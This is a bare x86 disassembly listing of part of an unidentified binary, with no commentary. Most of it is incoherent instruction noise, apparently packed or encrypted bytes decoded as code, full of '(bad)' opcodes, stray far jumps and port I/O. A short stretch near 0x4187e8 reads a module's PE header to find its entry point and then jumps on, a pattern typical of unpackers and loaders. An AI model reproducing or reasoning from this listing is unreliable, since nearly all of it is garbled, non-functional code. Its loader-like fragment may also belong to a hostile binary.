  418647:	adc    BYTE PTR [eax],dl
  418649:	xchg   esi,eax
  41864a:	loop   0x41860f
  41864c:	fprem1 
  41864e:	sbb    al,0xb3
  418650:	popa   
  418651:	popa   
  418652:	and    BYTE PTR [eax+ebp*4-0x29],al
  418656:	dec    edx
  418657:	call   0x73926910
  41865c:	sbb    BYTE PTR [eax],0xf9
  41865f:	imul   esi,DWORD PTR [edi+0x66],0xffffffcd
  418663:	shl    DWORD PTR [ecx],1
  418665:	dec    esi
  418666:	leave  
  418667:	and    DWORD PTR ds:[esp+ebp*4],ebx
  41866b:	dec    ebx
  41866c:	not    DWORD PTR [ecx-0x21260b66]
  418672:	daa    
  418673:	sub    al,0xa7
  418675:	or     al,0xae
  418677:	test   eax,0xb580fc4b
  41867c:	das    
  41867d:	outs   dx,BYTE PTR ds:[esi]
  41867e:	add    BYTE PTR [ebp+0xf],dl
  418681:	adc    eax,0xdd768f12
  418686:	jb     0x4186b0
  418688:	arpl   WORD PTR [ebx-0x66],cx
  41868b:	shl    BYTE PTR [ecx],0xd1
  41868e:	in     eax,0x65
  418690:	or     edx,ebp
  418692:	sbb    ah,BYTE PTR [ecx+0x236cfd68]
  418698:	push   0x45
  41869a:	add    edx,DWORD PTR [edx+0x5f]
  41869d:	xchg   ebp,eax
  41869e:	xchg   cl,bl
  4186a0:	jecxz  0x418650
  4186a2:	aad    0xc6
  4186a4:	out    dx,al
  4186a5:	add    esp,DWORD PTR [eax+eiz*2]
  4186a8:	cmp    BYTE PTR [esi],bl
  4186aa:	mov    ch,0x39
  4186ac:	jg     0x418652
  4186ae:	sbb    al,0x72
  4186b0:	inc    edi
  4186b1:	xor    eax,0xce6b7a06
  4186b6:	mov    cl,0xae
  4186b8:	pop    ss
  4186b9:	sahf   
  4186ba:	xchg   ecx,eax
  4186bb:	adc    al,0x87
  4186bd:	loope  0x41873a
  4186bf:	imul   esp,edi,0x62
  4186c2:	lds    edi,FWORD PTR [ebx-0x5a6ed789]
  4186c8:	sub    DWORD PTR [eax-0x1a],eax
  4186cb:	data16 add BYTE PTR [eax+0x72],0xb0
  4186d0:	inc    esi
  4186d1:	sbb    DWORD PTR [eax+edi*8-0x6d],edi
  4186d5:	js     0x4186ec
  4186d7:	xchg   esi,eax
  4186d8:	mov    dl,BYTE PTR [ebx-0x50ef2f4d]
  4186de:	pop    es
  4186df:	je     0x4186c9
  4186e1:	out    dx,al
  4186e2:	add    BYTE PTR [esi-0x31],0x41
  4186e6:	xor    al,0xe8
  4186e8:	sbb    DWORD PTR [edi+0x73],0xffffff89
  4186ec:	das    
  4186ed:	pop    es
  4186ee:	lock xchg esp,eax
  4186f0:	es mov ch,0x67
  4186f3:	mov    gs,ebp
  4186f5:	cwde   
  4186f6:	dec    edx
  4186f7:	xor    ecx,esp
  4186f9:	mov    al,ds:0x7b36e2ed
  4186fe:	mov    DWORD PTR ds:0xe0c0db05,edx
  418704:	pop    ebp
  418705:	leave  
  418706:	dec    ecx
  418707:	je     0x41877f
  418709:	shr    DWORD PTR [esi+0x53],0xa7
  41870d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41870e:	sbb    DWORD PTR [ecx-0x2c],eax
  418711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418712:	sete   BYTE PTR [ecx-0x32]
  418716:	loopne 0x418770
  418718:	jnp    0x41869f
  41871a:	add    ah,ch
  41871c:	cmp    bl,BYTE PTR [edx+ecx*2]
  41871f:	es (bad) 
  418721:	pop    ds
  418722:	pop    ecx
  418723:	sub    edi,edx
  418725:	xlat   BYTE PTR ds:[ebx]
  418726:	popa   
  418727:	xchg   ebp,eax
  418728:	daa    
  418729:	mov    ecx,0x8689963d
  41872e:	fisubr DWORD PTR [ebx]
  418730:	ins    DWORD PTR es:[edi],dx
  418731:	mov    edi,0x16e61e63
  418736:	dec    edx
  418737:	gs push 0xe9b0eb11
  41873d:	jecxz  0x4187ac
  41873f:	inc    ebx
  418740:	loop   0x4186f3
  418742:	call   0x98c53cbe
  418747:	xchg   edi,eax
  418748:	mov    dl,0xce
  41874a:	sahf   
  41874b:	mov    eax,ds:0xfdb140bd
  418750:	lock js 0x418714
  418753:	inc    esp
  418754:	cmc    
  418755:	in     al,dx
  418756:	inc    ecx
  418757:	leave  
  418758:	arpl   WORD PTR [ebx-0x62],dx
  41875b:	rcr    DWORD PTR [esp+ebx*8-0x44],0xc2
  418760:	cmp    eax,0xfa34723a
  418765:	push   edi
  418766:	pusha  
  418767:	sub    al,0x25
  418769:	or     cl,BYTE PTR [eax+0x5b]
  41876c:	mov    WORD PTR [eax+0x35066a86],es
  418772:	loope  0x4187c7
  418774:	pop    ds
  418775:	int    0xde
  418777:	fmul   QWORD PTR [ebx+0x1a]
  41877a:	mov    eax,ds:0x935be4df
  41877f:	cs cwde 
  418781:	push   eax
  418782:	call   0x120:0x81307793
  418789:	cmp    DWORD PTR [esi],ebx
  41878b:	js     0x418790
  41878d:	addps  xmm5,XMMWORD PTR [edx+esi*8]
  418791:	mov    al,0x4c
  418793:	sub    ebx,DWORD PTR [ebp-0x7e]
  418796:	pop    es
  418797:	jecxz  0x4187b7
  418799:	repnz inc esi
  41879b:	xchg   ecx,eax
  41879c:	jnp    0x41878c
  41879e:	jge    0x41875b
  4187a0:	cwde   
  4187a1:	xchg   esp,eax
  4187a2:	inc    ebp
  4187a3:	stc    
  4187a4:	adc    dl,BYTE PTR [ecx+0x79]
  4187a7:	lea    ebp,gs:[ebp-0x3a815d7e]
  4187ae:	push   ss
  4187af:	mov    WORD PTR [ebx-0x30],es
  4187b2:	clc    
  4187b3:	cmp    eax,0x6ab6219d
  4187b8:	sbb    DWORD PTR [ebx+edi*8],edi
  4187bb:	jbe    0x418800
  4187bd:	cmc    
  4187be:	leave  
  4187bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187c0:	jb     0x418746
  4187c2:	xchg   esi,eax
  4187c3:	dec    edx
  4187c4:	loope  0x418833
  4187c6:	xor    eax,0xc8a5e953
  4187cb:	(bad)  
  4187cc:	out    0xe9,al
  4187ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cf:	sbb    BYTE PTR ds:[eax-0x24ef7b39],dh
  4187d6:	adc    DWORD PTR [eax],0x1b
  4187d9:	in     al,0xa5
  4187db:	cmp    DWORD PTR [ebx-0x39],0xffffffaa
  4187df:	push   ecx
  4187e0:	xor    al,0x25
  4187e2:	add    ah,BYTE PTR [edx]
  4187e4:	test   ebp,esi
  4187e6:	stc    
  4187e7:	ret    
  4187e8:	push   ebp
  4187e9:	out    0x7f,al
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x7b1a1af2
  41883e:	pop    ebp
  41883f:	jo     0x418858
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	aad    0xfb
  41884a:	mov    bl,0xbc
  41884c:	push   ebp
  41884d:	loop   0x4188c0
  41884f:	in     al,0xb3
  418851:	mov    esi,0x7e953379
  418856:	sbb    DWORD PTR [eax-0x19],ecx
  418859:	mov    ebx,DWORD PTR ds:0x78c14978
  41885f:	pop    ebx
  418860:	bound  esp,QWORD PTR [ebp-0x54d1e1a6]
  418866:	mov    dl,0x8
  418868:	or     BYTE PTR [ecx-0xb4c2f3],ah
  41886e:	std    
  41886f:	stc    
  418870:	mov    ebp,0x51310e7
  418875:	aas    
  418876:	add    cl,BYTE PTR [ecx]
  418878:	fimul  WORD PTR [ecx+0x4f6b51bc]
  41887e:	jl     0x4188fe
  418880:	rcr    BYTE PTR [ecx-0x47],1
  418883:	jp     0x41886b
  418885:	xchg   ecx,eax
  418886:	push   es
  418887:	or     eax,0x3bd41c67
  41888c:	out    dx,eax
  41888d:	adc    eax,0x904baf8c
  418892:	gs sahf 
  418894:	outs   dx,BYTE PTR ds:[esi]
  418895:	push   esi
  418896:	adc    DWORD PTR [ecx+0x6f07cf64],edx
  41889c:	(bad)  
  41889d:	sub    eax,0xfd0abf4f
  4188a2:	inc    ecx
  4188a3:	fnsave [ebx-0x5a]
  4188a6:	mov    eax,ds:0x9bc551b4
  4188ab:	dec    eax
  4188ac:	call   0xe825:0x39a5f29d
  4188b3:	jb     0x4188a0
  4188b5:	js     0x418931
  4188b7:	enter  0xcb5c,0x76
  4188bb:	push   ds
  4188bc:	mov    eax,0x52cb2570
  4188c1:	shl    DWORD PTR [ebx+0x4a],cl
  4188c4:	mov    ebx,0x3458e9cc
  4188c9:	bound  ebx,QWORD PTR [ecx]
  4188cb:	in     eax,0x2
  4188cd:	jns    0x418883
  4188cf:	fldenv [ecx+0x11]
  4188d2:	sbb    eax,0x58be71fd
  4188d7:	pop    esp
  4188d8:	pop    esi
  4188d9:	jo     0x418895
  4188db:	mov    al,0x16
  4188dd:	mov    ecx,0xbcc6fefa
  4188e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e3:	cmp    al,0x54
  4188e5:	mov    al,0x60
  4188e7:	mov    cl,0x75
  4188e9:	jp     0x4188e5
  4188eb:	cli    
  4188ec:	jnp    0x418940
  4188ee:	cs xchg ebx,eax
  4188f0:	daa    
  4188f1:	mov    ecx,0xf01f3d3b
  4188f6:	sub    DWORD PTR ds:0xa04d8ff0,edx
  4188fc:	adc    eax,0xf9fbce80
  418901:	cmp    al,0xba
  418903:	mov    edx,0x1a63c6ae
  418908:	xor    DWORD PTR [esi-0x80],esi
  41890b:	loopne 0x418948
  41890d:	dec    esi
  41890e:	mov    WORD PTR [esi+eax*8-0x6c],gs
  418912:	fnstenv [ebx-0x4c7764da]
  418918:	or     esi,esi
  41891a:	xor    DWORD PTR [ebx],ebx
  41891c:	vmwrite ebx,DWORD PTR [eiz*1-0x6cb69357]
  418924:	mov    ebp,DWORD PTR [edi+0x54abdb55]
  41892a:	push   0xa
  41892c:	cmp    DWORD PTR [esi+0x5eae6eea],0xffffffb6
  418933:	jp     0x418994
  418935:	mov    esi,0x8734df6b
  41893a:	repz enter 0x84e5,0xea
  41893f:	dec    ebp
  418940:	xor    DWORD PTR [eax+0x45],0xb
  418944:	pop    ebx
  418945:	es sub dh,bl
  418948:	cmp    dh,dl
  41894a:	ins    BYTE PTR es:[edi],dx
  41894b:	xchg   DWORD PTR [ebx+ebx*4-0x40cc7dfe],eax
  418952:	shl    esp,cl
  418954:	pop    edx
  418955:	xchg   ecx,eax
  418956:	test   eax,0x5871312c
  41895b:	push   ss
  41895c:	add    ebp,DWORD PTR [esi+0x107cbd5d]
  418962:	xchg   edx,eax
  418963:	inc    ebx
  418964:	and    DWORD PTR [eax-0x2c],edx
  418967:	mov    bh,0xab
  418969:	imul   ecx,DWORD PTR [eax],0xffffff83
  41896c:	pop    esi
  41896d:	sub    DWORD PTR [edx],edi
  41896f:	jno    0x418911
  418971:	sub    al,0x57
  418973:	rcl    eax,cl
  418975:	cmp    ebp,eax
  418977:	cdq    
  418978:	test   DWORD PTR ds:0xaadbb3f,ebp
  41897e:	ins    DWORD PTR es:[edi],dx
  41897f:	outs   dx,BYTE PTR ds:[esi]
  418980:	ficom  DWORD PTR [edi+0x4f]
  418983:	imul   DWORD PTR [ecx+eiz*1+0x36fd168]
  41898a:	aas    
  41898b:	cmp    DWORD PTR [edx],ebp
  41898d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41898e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418990:	push   es
  418991:	daa    
  418992:	out    dx,eax
  418993:	scas   al,BYTE PTR es:[edi]
  418994:	fisubr WORD PTR [ecx+0x56]
  418997:	or     eax,0xf06a98ef
  41899c:	sub    ax,0xbb96
  4189a0:	inc    esi
  4189a1:	stos   DWORD PTR es:[edi],eax
  4189a2:	cdq    
  4189a3:	int    0x16
  4189a5:	sar    esp,cl
  4189a7:	cmp    edx,eax
  4189a9:	mov    DWORD PTR [ecx-0x6f331849],ebp
  4189af:	cmp    ecx,edi
  4189b1:	and    al,0x57
  4189b3:	cmc    
  4189b4:	jl     0x418964
  4189b6:	mov    ah,0xb9
  4189b8:	jno    0x418a0f
  4189ba:	call   0xb6b0:0x3a0e47a6
  4189c1:	sbb    ebx,0x2d
  4189c4:	jmp    0x23:0x18dbefd2
  4189cb:	xchg   esi,eax
  4189cc:	das    
  4189cd:	out    dx,al
  4189ce:	loope  0x418a10
  4189d0:	js     0x41897f
  4189d2:	or     ch,cl
  4189d4:	(bad)  
  4189d5:	jnp    0x418974
  4189d7:	repz xchg esi,eax
  4189d9:	addr16 mov ds:0x99c0,al
  4189dd:	fmul   QWORD PTR [ebx]
  4189df:	cmp    eax,0x51117e76
  4189e4:	push   esp
  4189e5:	in     al,dx
  4189e6:	in     eax,dx
  4189e7:	out    0xa1,eax
  4189e9:	stc    
  4189ea:	sub    edi,esi
  4189ec:	fsub   DWORD PTR [ebx]
  4189ee:	pop    ds
  4189ef:	lods   al,BYTE PTR ds:[esi]
  4189f0:	int    0xc2
  4189f2:	jne    0x4189ee
  4189f4:	arpl   WORD PTR [edx+0xa58ecd1],di
  4189fa:	enter  0x6bfa,0x52
  4189fe:	pusha  
  4189ff:	mov    esi,0xf1f08acb
  418a04:	je     0x418a72
  418a06:	retf   
  418a07:	dec    esi
  418a08:	dec    edi
  418a09:	popf   
  418a0a:	test   eax,0x6ab7289a
  418a0f:	mov    dl,0xc9
  418a11:	or     BYTE PTR [ebp-0x5de30620],bh
  418a17:	xchg   esp,eax
  418a18:	xchg   edi,eax
  418a19:	scas   al,BYTE PTR es:[edi]
  418a1a:	mov    cl,0x4e
  418a1c:	fcom   QWORD PTR [ecx+0x360eac25]
  418a22:	stos   BYTE PTR es:[edi],al
  418a23:	(bad)  
  418a24:	addr16 pop esp
  418a26:	push   cs
  418a27:	mov    esi,0x155b52aa
  418a2c:	inc    edx
  418a2d:	shr    DWORD PTR [ebx+0x3971d27d],1
  418a33:	jnp    0x4189f3
  418a35:	mov    DWORD PTR [edx+0x6af855dc],0x64a7556c
  418a3f:	xor    BYTE PTR [esi],ah
  418a41:	(bad)  
  418a42:	out    0x17,eax
  418a44:	(bad)  
  418a45:	cmp    BYTE PTR [edi-0x36],dh
  418a48:	fld    TBYTE PTR [edi+0x6c4e7e35]
  418a4e:	cld    
  418a4f:	test   ecx,ebx
  418a51:	inc    ebp
  418a52:	into   
  418a53:	xchg   ebp,eax
  418a54:	ins    BYTE PTR es:[edi],dx
  418a55:	loope  0x4189fd
  418a57:	inc    ebp
  418a58:	jcxz   0x418a1e
  418a5b:	sar    BYTE PTR [esp+ebx*1+0x21],0x60
  418a60:	pop    es
  418a61:	adc    eax,0xe1e5f159
  418a66:	sahf   
  418a67:	cdq    
  418a68:	ja     0x418ad0
  418a6a:	pop    esi
  418a6b:	push   ss
  418a6c:	inc    ebp
  418a6d:	lods   eax,DWORD PTR ds:[esi]
  418a6e:	and    ah,BYTE PTR [edx+0x20]
  418a71:	cmp    BYTE PTR [edi-0x24],0xa
  418a75:	sub    esp,DWORD PTR ds:0xce4d46f3
  418a7b:	aas    
  418a7c:	ret    0xfe5d
  418a7f:	push   ebp
  418a80:	mov    gs,WORD PTR [edi-0xb]
  418a83:	mov    ds:0xb5166d32,al
  418a88:	fcom   QWORD PTR [eax-0x58288666]
  418a8e:	inc    edx
  418a8f:	push   ebx
  418a90:	inc    eax
  418a91:	mov    cl,0x27
  418a93:	cmp    BYTE PTR [eax],al
  418a95:	shl    BYTE PTR [edi],0x54
  418a98:	add    eax,0xffffff93
  418a9b:	dec    edi
  418a9c:	mov    ebx,0x8a1a2e49
  418aa1:	nop
  418aa2:	dec    eax
  418aa3:	cmc    
  418aa4:	xchg   BYTE PTR [edi+0x759036b3],ch
  418aaa:	mov    ds:0xc80b618a,eax
  418aaf:	or     al,0x67
  418ab1:	ret    
  418ab2:	or     al,0x3b
  418ab4:	xchg   edx,eax
  418ab5:	fcomp  DWORD PTR [ecx]
  418ab7:	add    al,0x48
  418ab9:	pusha  
  418aba:	ds clc 
  418abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418abd:	cmp    cl,ah
  418abf:	mov    ch,0xe9
  418ac1:	loopne 0x418b1f
  418ac3:	xlat   BYTE PTR ds:[ebx]
  418ac4:	rcl    ebx,0xc1
  418ac7:	popa   
  418ac8:	mov    esi,0x9a0d9c0e
  418acd:	push   esi
  418ace:	pop    edi
  418acf:	adc    ebx,edx
  418ad1:	push   cs
  418ad2:	inc    eax
  418ad3:	push   esi
  418ad4:	mov    eax,ds:0xd223306
  418ad9:	adc    al,0x22
  418adb:	mov    ds:0x16ff6e4c,al
  418ae0:	cld    
  418ae1:	dec    eax
  418ae2:	adc    dh,BYTE PTR [ecx]
  418ae4:	push   esp
  418ae5:	pop    ss
  418ae6:	jmp    0x418b56
  418ae8:	or     al,0xa9
  418aea:	inc    esp
  418aeb:	test   ecx,0x1db09598
  418af1:	xor    dl,BYTE PTR [edi+0x280875a2]
  418af7:	sub    BYTE PTR [edi-0x36],cl
  418afa:	out    0x8f,al
  418afc:	lds    edx,FWORD PTR [edi+0x390a4b55]
  418b02:	bound  ebp,QWORD PTR [ecx+0x1c]
  418b05:	outs   dx,DWORD PTR ds:[esi]
  418b06:	jo     0x418b34
  418b08:	xchg   esi,eax
  418b09:	add    BYTE PTR [ebp-0x16],dh
  418b0c:	in     eax,0x44
  418b0e:	add    DWORD PTR [ebx],ebx
  418b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b11:	lock bound ecx,QWORD PTR [esi-0x752654cd]
  418b18:	jmp    DWORD PTR [edi+edx*1-0x1d75f592]
  418b1f:	sar    ah,cl
  418b21:	int    0xf9
  418b23:	xchg   ebp,eax
  418b24:	jmp    0xff1370ed
  418b29:	mov    edi,0xc6eeeb69
  418b2e:	arpl   WORD PTR [ebx],di
  418b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b31:	inc    ecx
  418b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b33:	cmp    dh,BYTE PTR [edx+0x1216bd38]
  418b39:	push   cs
  418b3a:	mov    ch,0x48
  418b3c:	mov    al,ds:0xa0b8afed
  418b41:	or     eax,ebx
  418b43:	lahf   
  418b44:	in     eax,0xff
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	jmp    0x7fc3:0x129ec96f
  418b69:	js     0x418be6
  418b6b:	jle    0x418be5
  418b6d:	js     0x418b66
  418b6f:	or     BYTE PTR [edx-0x4426a84a],dl
  418b75:	cmp    ecx,DWORD PTR [edx+0x47]
  418b78:	les    ebp,FWORD PTR [eax-0x1eee49e1]
  418b7e:	jecxz  0x418b68
  418b80:	imul   ebp,DWORD PTR [eax-0x3a],0xd78fa048
  418b87:	xor    eax,0xbac34a1d
  418b8c:	xor    BYTE PTR [ebp+0x42],dl
  418b8f:	ret    0x7890
  418b92:	sbb    BYTE PTR [esi],ch
  418b94:	test   DWORD PTR [ebx],eax
  418b96:	stc    
  418b97:	pop    esi
  418b98:	adc    bh,BYTE PTR [eax+0x29bf9e29]
  418b9e:	cli    
  418b9f:	sub    eax,0xc5f66590
  418ba4:	inc    ebp
  418ba5:	push   ss
  418ba6:	test   BYTE PTR ds:[edi-0x3c5e3b77],bh
  418bad:	mov    ecx,0xe565b399
  418bb2:	adc    BYTE PTR [ebp-0x3d],dl
  418bb5:	int    0x1f
  418bb7:	cmp    BYTE PTR [ebx],cl
  418bb9:	ficom  WORD PTR [ebp-0x24]
  418bbc:	mov    eax,ds:0x3544278d
  418bc1:	jne    0x418c21
  418bc3:	adc    dl,BYTE PTR [ebx-0x432d54fa]
  418bc9:	xchg   esp,eax
  418bca:	mov    eax,0x685bc35a
  418bcf:	mov    eax,0x6da227a0
  418bd4:	ja     0x418bd2
  418bd6:	lods   al,BYTE PTR ds:[esi]
  418bd7:	pop    esp
  418bd8:	sub    al,0xbe
  418bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bdb:	test   DWORD PTR [edx],ebp
  418bdd:	sbb    dh,bh
  418bdf:	ins    BYTE PTR es:[edi],dx
  418be0:	jecxz  0x418b6a
  418be2:	inc    eax
  418be3:	rcl    eax,1
  418be5:	(bad)  
  418be6:	jle    0x418c54
  418be8:	pop    ss
  418be9:	ficomp WORD PTR [edi+edi*4]
  418bec:	mov    BYTE PTR [edx],al
  418bee:	pop    edx
  418bef:	mov    esp,0x8529f4b7
  418bf4:	inc    eax
  418bf5:	dec    eax
  418bf6:	lods   al,BYTE PTR ds:[esi]
  418bf7:	jmp    DWORD PTR [ecx+ecx*1-0x47205ee9]
  418bfe:	jg     0x418c78
  418c00:	push   esi
  418c01:	sbb    BYTE PTR [ecx-0x36bb193],ah
  418c07:	stos   BYTE PTR es:[edi],al
  418c08:	or     eax,0x26fb80ee
  418c0d:	aam    0x27
  418c0f:	push   ecx
  418c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c11:	das    
  418c12:	xchg   esi,eax
  418c13:	inc    ecx
  418c14:	mov    esp,0xd23151f3
  418c19:	and    eax,0xda129659
  418c1e:	push   ecx
  418c1f:	(bad)  
  418c20:	les    esp,FWORD PTR [ebx-0x4a]
  418c23:	enter  0x4dcb,0xa9
  418c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c28:	imul   edi,DWORD PTR [eiz*8-0x6fb3e28f],0xed01ea47
  418c33:	or     al,0x20
  418c35:	rcl    esp,1
  418c37:	mov    ch,0x7d
  418c39:	inc    esp
  418c3a:	fld    QWORD PTR ds:0x5951c74a
  418c40:	cwde   
  418c41:	std    
  418c42:	dec    eax
  418c43:	adc    al,0x34
  418c45:	mov    ds:0xafdfacb8,al
  418c4a:	mov    WORD PTR [eax+0x22b53faa],?
  418c50:	pop    ebp
  418c51:	push   eax
  418c52:	js     0x418bdc
  418c54:	push   cs
  418c55:	lds    esi,FWORD PTR [ebx+edx*2+0x267afaf2]
  418c5c:	cs mov al,0xb8
  418c5f:	mov    eax,cs
  418c61:	and    al,0x8b
  418c63:	in     al,dx
  418c64:	mov    eax,ds:0x3f3d8379
  418c69:	arpl   WORD PTR [edi-0x2e],cx
  418c6c:	dec    ebx
  418c6d:	popf   
  418c6e:	mov    ecx,0xc6224023
  418c73:	fsubr  DWORD PTR [edi]
  418c75:	pop    esi
  418c76:	cli    
  418c77:	outs   dx,BYTE PTR ds:[esi]
  418c78:	mov    ds:0x7ba51a59,al
  418c7d:	mov    dl,0x4
  418c7f:	xor    edx,DWORD PTR [edx]
  418c81:	xor    DWORD PTR [ecx-0x64c96734],ebx
  418c87:	rep outs dx,DWORD PTR ds:[si]
  418c8a:	xlat   BYTE PTR ds:[ebx]
  418c8b:	adc    DWORD PTR [edx+0x52b9a213],eax
  418c91:	pop    ecx
  418c92:	add    al,0x94
  418c94:	ss ss pop esp
  418c97:	lea    esp,ds:0x25c06f87
  418c9d:	mov    eax,0xe220b3b3
  418ca2:	pop    es
  418ca3:	and    bl,al
  418ca5:	xchg   ebp,edx
  418ca7:	aas    
  418ca8:	mov    ebx,0xe11f4fa
  418cad:	je     0x418c34
  418caf:	mov    ebx,esi
  418cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb2:	jl     0x418c8b
  418cb4:	test   DWORD PTR [ebx-0x4f],ebx
  418cb7:	test   BYTE PTR [edx-0x5803590f],ch
  418cbd:	xor    eax,0x4c1af0d9
  418cc2:	cmp    bh,al
  418cc4:	xchg   ebp,eax
  418cc5:	ja     0x418d0a
  418cc7:	(bad)  
  418cc8:	mov    ds:0x79f44148,eax
  418ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cce:	imul   edi,ecx,0x489067f9
  418cd4:	aas    
  418cd5:	rcl    DWORD PTR [ebx],cl
  418cd7:	push   ss
  418cd8:	xchg   DWORD PTR [ebx],edi
  418cda:	aaa    
  418cdb:	jle    0x418c7d
  418cdd:	div    DWORD PTR [ecx-0x41]
  418ce0:	mov    eax,ds:0x6408b21c
  418ce5:	cs push edi
  418ce7:	sahf   
  418ce8:	mov    ds:0x5b45c6ba,al
  418ced:	out    0xc7,eax
  418cef:	leave  
  418cf0:	fld    TBYTE PTR [ebp-0x6a]
  418cf3:	sbb    edi,edx
  418cf5:	xor    ecx,DWORD PTR [esi-0x73]
  418cf8:	(bad)  
  418cf9:	fcom   DWORD PTR [eax+0x6ca0828f]
  418cff:	and    DWORD PTR [edx-0x6a],edi
  418d02:	enter  0xb619,0x25
  418d06:	adc    dl,al
  418d08:	sub    bh,BYTE PTR [ecx]
  418d0a:	xchg   ecx,eax
  418d0b:	ret    
  418d0c:	jmp    0x5a718462
  418d11:	hlt    
  418d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d13:	lods   eax,DWORD PTR ds:[esi]
  418d14:	inc    ebp
  418d15:	(bad)  
  418d17:	outs   dx,WORD PTR ds:[esi]
  418d19:	add    al,0x16
  418d1b:	sub    esp,edi
  418d1d:	ja     0x418cf5
  418d1f:	test   BYTE PTR [ebx+0x7],bh
  418d22:	leave  
  418d23:	inc    esp
  418d24:	dec    edx
  418d25:	enter  0x9b5b,0x98
  418d29:	inc    esi
  418d2a:	cmp    al,0x42
  418d2c:	data16 sub al,0x8d
  418d2f:	loop   0x418d68
  418d31:	stos   DWORD PTR es:[edi],eax
  418d32:	jl     0x418d5c
  418d34:	jecxz  0x418d28
  418d36:	xor    al,0x71
  418d38:	mov    esi,0xc66468e3
  418d3d:	clc    
  418d3e:	ret    0x7721
  418d41:	xchg   ebx,eax
  418d42:	out    0xb0,al
  418d44:	hlt    
  418d45:	rcl    BYTE PTR [ebx],1
  418d47:	mov    ebx,DWORD PTR [edx]
  418d49:	jno    0x418d93
  418d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d4c:	mov    eax,ds:0x236e8edf
  418d51:	inc    ebp
  418d52:	xor    esp,DWORD PTR [esi+0x16bd865d]
  418d58:	leave  
  418d59:	mov    BYTE PTR [esi],ah
  418d5b:	nop
  418d5c:	aam    0xe
  418d5e:	int    0xf
  418d60:	adc    cl,BYTE PTR [ebp-0x79]
  418d63:	adc    ebp,edi
  418d65:	inc    esp
  418d66:	sub    BYTE PTR [ecx+0x48ad4e30],cl
  418d6c:	and    dh,BYTE PTR [ebx]
  418d6e:	popf   
  418d6f:	push   esi
  418d70:	push   cs
  418d71:	pop    ebp
  418d72:	lock dec ecx
  418d74:	add    BYTE PTR [ebx-0x11198c6d],bl
  418d7a:	ss push es
  418d7c:	sub    BYTE PTR [edi],bl
  418d7e:	push   esi
  418d7f:	push   edx
  418d80:	push   ds
  418d81:	sbb    BYTE PTR [edi],dh
  418d83:	xor    al,0x31
  418d85:	push   esi
  418d86:	add    DWORD PTR [ebp-0x2d],eax
  418d89:	mov    ebx,0x92bce569
  418d8e:	xchg   ecx,eax
  418d8f:	xchg   ebp,eax
  418d90:	outs   dx,BYTE PTR ds:[esi]
  418d91:	pop    ecx
  418d92:	jnp    0x418dd1
  418d94:	xchg   esp,eax
  418d95:	cmp    BYTE PTR [esi],0xb1
  418d98:	jbe    0x418d46
  418d9a:	push   ebx
  418d9b:	push   ebx
  418d9c:	scas   eax,DWORD PTR es:[edi]
  418d9d:	(bad)  
  418d9e:	das    
  418d9f:	pop    ds
  418da0:	(bad)  
  418da2:	xchg   cl,dl
  418da4:	xor    eax,0x33fe6362
  418da9:	jbe    0x418d9f
  418dab:	sub    BYTE PTR gs:[ebx],cl
  418dae:	push   edx
  418daf:	push   es
  418db0:	es movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  418db3:	sbb    eax,0x938a16b2
  418db8:	in     eax,0x47
  418dba:	dec    edi
  418dbb:	jns    0x418d52
  418dbd:	imul   esp,DWORD PTR [ebx-0x17],0xb20d656d
  418dc4:	or     BYTE PTR [edx+0x2c],bh
  418dc7:	cmp    bh,BYTE PTR [edx-0x47]
  418dca:	aas    
  418dcb:	push   eax
  418dcc:	pop    edi
  418dcd:	lods   al,BYTE PTR ds:[esi]
  418dce:	jp     0x418d84
  418dd0:	adc    eax,0x564707df
  418dd5:	adc    eax,0x764ae3ea
  418dda:	fisttp QWORD PTR [eax-0x1431c466]
  418de0:	pop    edx
  418de1:	and    al,0xc1
  418de3:	popa   
  418de4:	add    DWORD PTR ss:[ebx],ecx
  418de7:	jp     0x418e18
